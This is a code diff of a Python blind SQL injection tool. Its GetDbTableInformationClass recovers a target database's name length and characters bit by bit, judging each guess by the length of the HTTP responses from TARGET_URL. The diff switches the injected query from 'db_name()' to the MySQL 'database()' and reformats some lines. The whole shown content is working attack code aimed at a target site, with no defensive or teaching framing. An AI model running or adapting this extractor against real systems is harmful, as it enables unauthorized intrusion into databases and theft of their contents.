@@ -6,8 +6,8 @@ class GetDbTableInformationClass:
     def __init__(self, method=bitwise_public.HTTPMethod.GET):
         self.SUCCESS_LENGTH = len(requests.post(url=bitwise_public.TARGET_URL, data=bitwise_public.SUCCESS_DATA_PARAMS)
                                   .text) \
-                                    if method==bitwise_public.HTTPMethod.POST else len(requests.get(bitwise_public.TARGET_URL)
-                                                                               .text)
+            if method == bitwise_public.HTTPMethod.POST else len(requests.get(bitwise_public.TARGET_URL)
+                                                                 .text)
         # Using DB name length
         self.db_name_length = 0
         # Using DB name
@@ -22,7 +22,9 @@ class GetDbTableInformationClass:
     # SQL Injection method
     def get_db_name_length(self, method=bitwise_public.HTTPMethod.GET):
         length_bin_list = []
-        query = 'db_name()'
+        # change query used db
+        # query = 'select db_name()'
+        query = 'database()'
 
         for shift_idx in range(7, -1, -1):
             res_length = bitwise_public.get_length_by_post_method(query, shift_idx) if method == bitwise_public. \
@@ -35,16 +37,18 @@ class GetDbTableInformationClass:
     def get_db_name(self, method=bitwise_public.HTTPMethod.GET):
         # one character list, not string
         db_name_char_list = []
-        query = 'db_name()'
+        # query = 'db_name()'
+        query = 'database()'
 
         for db_name_idx in range(self.db_name_length):
             db_name_char_bin_list = []
             for shift_idx in range(7, -1, -1):
                 res_length = bitwise_public.get_data_by_post_method(query, db_name_idx, shift_idx, 0) if method == \
-                             bitwise_public.HTTPMethod.POST else bitwise_public.get_data_by_get_method(query,
-                                                                                                       db_name_idx + 1,
-                                                                                                       shift_idx,
-                                                                                                       0)
+                                                                                                         bitwise_public.HTTPMethod.POST else bitwise_public.get_data_by_get_method(
+                    query,
+                    db_name_idx + 1,
+                    shift_idx,
+                    0)
                 db_name_char_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))
 
             db_name_char_list.append(bitwise_public.parsing_bin_list_to_char(db_name_char_bin_list))
